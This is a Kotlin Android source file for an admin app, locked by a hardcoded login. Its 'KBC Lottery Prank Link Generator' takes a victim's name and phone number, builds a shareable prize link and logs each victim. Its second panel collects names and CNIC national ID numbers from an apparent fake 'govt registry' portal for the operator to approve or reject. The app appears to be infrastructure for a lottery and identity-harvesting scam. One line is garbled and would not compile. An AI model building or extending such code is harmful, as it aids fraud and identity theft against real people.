package com.example

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.app.NotificationCompat
import com.example.ui.theme.MyApplicationTheme
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query

// Existing Data Model (Don't Touch)
data class LocalPrankModel(
    val id: Long,
    val victimName: String,
    val victimNumber: String,
    val generatedLink: String
)

// NEW DATA MODEL: For Vercel Govt Registry Data
data class GovtRegistryModel(
    val id: String = "",
    val userName: String = "",
    val cnicOrId: String = "",
    val status: String = "Pending",
    val timestamp: Long = 0L
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        createNotificationChannel()
        
        setContent {
            MyApplicationTheme {
                var isAuthenticated by remember { mutableStateOf(false) }
                
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    if (!isAuthenticated) {
                        LoginScreen(
                            modifier = Modifier.padding(innerPadding),
                            onLoginSuccess = { isAuthenticated = true }
                        )
                    } else {
                        KbcPrankApp(
                            modifier = Modifier.padding(innerPadding)
                        )
                    }
                }
            }
        }
    }

    // Helper to create Android Notification Channel safely
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "govt_registry_channel",
                "Govt Registry Notifications",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Triggers when a new user registers on Vercel portal"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }
}

@Composable
fun LoginScreen(
    modifier: Modifier = Modifier,
    onLoginSuccess: () -> Unit
) {
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    val context = LocalContext.current

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB)),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(24.dp),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = "Admin Access",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1F2937)
                )
                Spacer(modifier = Modifier.height(24.dp))
                
                OutlinedTextField(
                    value = username,
                    onValueChange = { username = it },
                    label = { Text("ID") },
                    leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )
                
                Spacer(modifier = Modifier.height(16.dp))

                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    visualTransformation = PasswordVisualTransformation(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = {
                        if (username.trim() == "jani681" && password == "kbc5800/") {
                            onLoginSuccess()
                        } else {
                            Toast.makeText(context, "Invalid ID or Password", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A))
                ) {
                    Text("Login", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun KbcPrankApp(
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val firestore = remember { FirebaseFirestore.getInstance() }
    
    var victimName by remember { mutableStateOf("") }
    var victimNumber by remember { mutableStateOf("") }
    var generatedLink by remember { mutableStateOf("") }
    var showSuccessDialog by remember { mutableStateOf(false) }
    
    // State management for navigation tabs
    var selectedTab by remember { mutableStateOf(0) }

    // Real-time Storage Lists
    val historyList = remember { mutableStateListOf<LocalPrankModel>() }
    val govtRegistryList = remember { mutableStateListOf<GovtRegistryModel>() }

    // Track processed document IDs to avoid double push notifications on app launch
    val processedDocIds = remember { mutableStateOf(setOf<String>()) }

    // LISTENER 1: Existing Link Generator History Sync
    LaunchedEffect(Unit) {
        firestore.collection("sarif_registry")
            .orderBy("id", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("FIRESTORE_ERROR", "Data fetch failed: ${error.message}")
                    return@addSnapshotListener
                }
                if (snapshot != null) {
                    historyList.clear()
                    for (doc in snapshot.documents) {
                        try {
                            val id = doc.getLong("id") ?: System.currentTimeMillis()
                            val name = doc.getString("victimName") ?: ""
                            val number = doc.getString("victimNumber") ?: ""
                            val link = doc.getString("generatedLink") ?: ""
                            historyList.add(LocalPrankModel(id, name, number, link))
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                }
            }
    }

    // LISTENER 2: New Real-time listener for govt-registry (Connected to Vercel portal)
    LaunchedEffect(Unit) {
        firestore.collection("govt_registry")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("FIRESTORE_GOVT_ERROR", "Govt fetch failed: ${error.message}")
                    return@addSnapshotListener
                }
                if (snapshot != null) {
                    val isFirstLoad = processedDocIds.value.isEmpty()
                    val currentBatchIds = mutableSetOf<String>()

                    govtRegistryList.clear()
                    for (doc in snapshot.documents) {
                        try {
                            val id = doc.id
                            val uName = doc.getString("userName") ?: ""
                            val cnic = doc.getString("cnicOrId") ?: ""
                            val currentStatus = doc.getString("status") ?: "Pending"
                            val time = doc.getLong("timestamp") ?: 0L

                            currentBatchIds.add(id)
                            govtRegistryList.add(GovtRegistryModel(id, uName, cnic, currentStatus, time))

                            // If a new pending item lands after the first listener sync, blast notification
                            if (!isFirstLoad && !processedDocIds.value.contains(id) && currentStatus == "Pending") {
                                triggerLocalNotification(context, uName)
                            }
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                    processedDocIds.value = currentBatchIds
                }
            }
    }

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB))
    ) {
        Column(
            modifier = Modifier.fillMaxSize(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Main Top Bar
            TabRow(
                selectedTabIndex = selectedTab,
                containerColor = Color(0xFF1E3A8A),
                contentColor = Color.White
            ) {
                Tab(
                    selected = selectedTab == 0,
                    onClick = { selectedTab = 0 },
                    text = { Text("Link Generator", fontWeight = FontWeight.Bold, fontSize = 14.sp) },
                    icon = { Icon(Icons.Default.Build, contentDescription = null) }
                )
                Tab(
                    selected = selectedTab == 1,
                    onClick = { selectedTab = 1 },
                    text = { Text("Govt Registry", fontWeight = FontWeight.Bold, fontSize = 14.sp) },
                    icon = { Icon(Icons.Default.List, contentDescription = null) }
                )
            }

            // DYNAMIC VIEW SWAPPER BASED ON SELECTED TAB
            Column(
                modifier = Modifier
                    .fill someConstraints
                    .weight(1f)
                    .padding(16.dp)
            ) {
                if (selectedTab == 0) {
                    // --- TAB 1: ORIGINAL CODE SYSTEM ---
                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 16.dp),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF1E3A8A))
                    ) {
                        Column(
                            modifier = Modifier.padding(20.dp),
                            horizontalAlignment = Alignment.CenterHorizontally
                        ) {
                            Text(
                                text = "KBC Lottery Prank Link Generator",
                                color = Color.White,
                                fontSize = 20.sp,
                                fontWeight = FontWeight.Bold,
                                textAlign = TextAlign.Center
                            )
                        }
                    }

                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 16.dp),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = Color.White),
                        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
                    ) {
                        Column(modifier = Modifier.padding(16.dp)) {
                            OutlinedTextField(
                                value = victimName,
                                onValueChange = { victimName = it },
                                label = { Text("Victim Name") },
                                leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                                modifier = Modifier.fillMaxWidth(),
                                singleLine = true,
                                shape = RoundedCornerShape(12.dp)
                            )
                            Spacer(modifier = Modifier.height(12.dp))
                            OutlinedTextField(
                                value = victimNumber,
                                onValueChange = { victimNumber = it },
                                label = { Text("Victim Phone Number") },
                                leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                                modifier = Modifier.fillMaxWidth(),
                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                                singleLine = true,
                                shape = RoundedCornerShape(12.dp)
                            )
                            Spacer(modifier = Modifier.height(16.dp))

                            Button(
                                onClick = {
                                    if (victimName.isBlank() || victimNumber.isBlank()) {
                                        Toast.makeText(context, "Please enter details", Toast.LENGTH_SHORT).show()
                                    } else {
                                        val baseSharedUrl = "https://kbc-lottery.vercel.app/"
                                        val finalLink = "${baseSharedUrl}?name=${Uri.encode(victimName.trim())}&num=${Uri.encode(victimNumber.trim())}"
                                        generatedLink = finalLink
                                        showSuccessDialog = true
                                        val timestampId = System.currentTimeMillis()

                                        val firestoreData = mapOf(
                                            "id" to timestampId,
                                            "victimName" to victimName.trim(),
                                            "victimNumber" to victimNumber.trim(),
                                            "generatedLink" to finalLink
                                        )
                                        firestore.collection("sarif_registry")
                                            .document(timestampId.toString()).set(firestoreData)
                                    }
                                },
                                modifier = Modifier.fillMaxWidth().height(48.dp),
                                shape = RoundedCornerShape(12.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
                            ) {
                                Text("Generate Prize Link")
                            }
                            Spacer(modifier = Modifier.height(8.dp))
                            Button(
                                onClick = {
                                    context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html")))
                                },
                                modifier = Modifier.fillMaxWidth().height(48.dp),
                                shape = RoundedCornerShape(12.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
                            ) {
                                Text("Create Registration Certificate")
                            }
                        }
                    }

                    // Prank History List
                    Text("Live Link History", fontWeight = FontWeight.Bold, color = Color.DarkGray, modifier = Modifier.padding(vertical = 8.dp))
                    if (historyList.isEmpty()) {
                        Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                            Text("No records found", color = Color.Gray)
                        }
                    } else {
                        LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                            items(historyList, key = { it.id }) { prank ->
                                HistoryItemRow(prank = prank, context = context)
                            }
                        }
                    }

                } else {
                    // --- TAB 2: BRAND NEW GOVT REGISTRY CODE SYSTEM ---
                    Card(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 16.dp),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF0F172A))
                    ) {
                        Column(modifier = Modifier.padding(16.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("صارف پروفائل رجسٹری پینل", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                            Spacer(modifier = Modifier.height(6.dp))
                            Button(
                                onClick = {
                                    context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://govt-registry.vercel.app")))
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB)),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Text("Open Vercel Entry Portal", fontSize = 12.sp)
                            }
                        }
                    }

                    Text("Vercel Live Portal Sync Status", fontWeight = FontWeight.Bold, color = Color.DarkGray, modifier = Modifier.padding(vertical = 4.dp))
                    
                    if (govtRegistryList.isEmpty()) {
                        Box(modifier = Modifier.fillMaxWidth().weight(1f), contentAlignment = Alignment.Center) {
                            Text("No registrations filed yet via Vercel.", color = Color.Gray)
                        }
                    } else {
                        LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                            items(govtRegistryList, key = { it.id }) { userEntry ->
                                GovtRegistryItemRow(
                                    entry = userEntry,
                                    onApprove = {
                                        firestore.collection("govt_registry").document(userEntry.id).update("status", "Approved")
                                            .addOnSuccessListener { Toast.makeText(context, "Approved!", Toast.LENGTH_SHORT).show() }
                                    },
                                    onReject = {
                                        firestore.collection("govt_registry").document(userEntry.id).update("status", "Rejected")
                                            .addOnSuccessListener { Toast.makeText(context, "Rejected!", Toast.LENGTH_SHORT).show() }
                                    }
                                )
                            }
                        }
                    }
                }
            }
        }

        // Existing Dialog Logic preserved cleanly
        if (showSuccessDialog) {
            Dialog(onDismissRequest = { showSuccessDialog = false }) {
                Card(
                    modifier = Modifier.fillMaxWidth().padding(16.dp),
                    shape = RoundedCornerShape(20.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White)
                ) {
                    Column(modifier = Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.CheckCircle, contentDescription = null, tint = Color(0xFF10B981), modifier = Modifier.size(54.dp))
                        Spacer(modifier = Modifier.height(12.dp))
                        OutlinedTextField(value = generatedLink, onValueChange = {}, readOnly = true, modifier = Modifier.fillMaxWidth())
                        Spacer(modifier = Modifier.height(16.dp))
                        Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                            OutlinedButton(onClick = {
                                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", generatedLink))
                            }) { Text("Copy") }
                            Button(onClick = {
                                val intent = Intent(Intent.ACTION_SEND).apply { type = "text/plain"; putExtra(Intent.EXTRA_TEXT, generatedLink) }
                                context.startActivity(Intent.createChooser(intent, "Share via"))
                            }, colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))) { Text("Share") }
                        }
                    }
                }
            }
        }
    }
}

// UI RENDERING ROW: For Govt Registry Items (Approve/Reject Logic Integration)
@Composable
fun GovtRegistryItemRow(
    entry: GovtRegistryModel,
    onApprove: () -> Unit,
    onReject: () -> Unit
) {
    val statusColor = when (entry.status) {
        "Approved" -> Color(0xFF10B981)
        "Rejected" -> Color(0xFFEF4444)
        else -> Color(0xFFF59E0B) // Pending
    }

    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(text = entry.userName, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
                Text(text = "ID/CNIC: ${entry.cnicOrId}", fontSize = 13.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                
                Surface(
                    color = statusColor.copy(alpha = 0.15f),
                    shape = RoundedCornerShape(6.dp)
                ) {
                    Text(
                        text = entry.status,
                        color = statusColor,
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp)
                    )
                }
            }

            // Action Trigger Elements (Show only if request state is Pending)
            if (entry.status == "Pending") {
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    IconButton(onClick = onApprove) {
                        Icon(Icons.Default.Check, contentDescription = "Approve", tint = Color(0xFF10B981))
                    }
                    IconButton(onClick = onReject) {
                        Icon(Icons.Default.Close, contentDescription = "Reject", tint = Color(0xFFEF4444))
                    }
                }
            }
        }
    }
}

// EXISTING ROW RENDERER (Preserved Flawlessly)
@Composable
fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(text = prank.victimName, fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF1F2937))
                Text(text = prank.victimNumber, fontSize = 13.sp, color = Color.Gray)
                Spacer(modifier = Modifier.height(4.dp))
                Text(text = prank.generatedLink, fontSize = 11.sp, color = Color(0xFF2563EB), maxLines = 1, overflow = TextOverflow.Ellipsis)
            }
            Row {
                IconButton(onClick = {
                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    clipboard.setPrimaryClip(ClipData.newPlainText("KBC Link", prank.generatedLink))
                    Toast.makeText(context, "Copied!", Toast.LENGTH_SHORT).show()
                }) { Icon(Icons.Default.Share, contentDescription = "Copy", tint = Color(0xFF4B5563)) }
            }
        }
    }
}

// Standalone Push Notification Function
fun triggerLocalNotification(context: Context, name: String) {
    val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    val builder = NotificationCompat.Builder(context, "govt_registry_channel")
        .setSmallIcon(android.R.drawable.stat_notify_chat)
        .setContentTitle("Nayi Registration Aayi Hai!")
        .setContentText("$name ne portal par register kiya hai.")
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setAutoCancel(true)

    notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
}
